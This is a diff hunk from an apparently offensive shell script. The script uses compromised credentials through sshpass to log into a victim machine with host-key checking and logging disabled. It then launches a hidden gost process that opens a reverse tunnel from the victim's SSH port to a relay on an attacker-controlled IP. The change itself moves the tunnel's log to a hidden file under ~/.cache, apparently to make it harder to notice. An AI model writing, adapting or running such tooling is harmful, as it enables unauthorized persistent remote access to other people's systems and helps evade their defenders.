@@ -127,7 +127,7 @@ sshpass -p "${COMPROMISED_PASS}" ssh \
   -o UserKnownHostsFile=/dev/null \
   -o LogLevel=ERROR \
   "${COMPROMISED_USER}@${VICTIM_IP}" \
-  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > /var/tmp/.gost-client.log 2>&1 < /dev/null &"
+  "nohup ~/.local/bin/gost -L rtcp://127.0.0.1:2223/127.0.0.1:22 -F relay://${ATTACKER_IP}:9002 > ~/.cache/.gost-client.log 2>&1 < /dev/null &"
 
 sleep 3
 
